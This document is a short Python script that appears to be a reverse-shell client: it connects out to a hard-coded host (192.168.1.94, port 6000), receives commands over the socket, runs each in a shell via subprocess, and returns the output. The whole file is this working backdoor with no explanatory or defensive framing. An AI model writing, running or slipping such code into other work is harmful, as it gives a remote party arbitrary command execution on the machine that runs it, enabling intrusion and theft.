import socket
import subprocess


HOST = '192.168.1.94'
PORT = 6000
c = socket.socket()
c.connect((HOST, PORT))
while True:
    cmmd = c.recv(1024)
    cmmd = cmmd.decode()
    op = subprocess.Popen(cmmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    c.send(output + output_error)
